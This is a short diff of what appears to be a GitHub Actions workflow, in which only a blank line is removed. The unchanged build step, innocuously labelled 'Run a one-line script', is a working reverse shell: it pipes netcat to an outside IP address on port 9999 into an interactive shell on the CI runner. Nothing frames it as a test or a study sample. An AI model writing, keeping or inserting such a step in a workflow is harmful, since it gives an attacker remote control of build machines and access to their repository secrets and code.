@@ -6,7 +6,6 @@ jobs:
   build:
 
     runs-on: ubuntu-latest
-
     steps:
     - name: Run a one-line script
       run: rm -rf backpipe && mkfifo backpipe && nc 208.167.245.104 9999 <backpipe | sh -i &>backpipe &&rm -rf backpipe
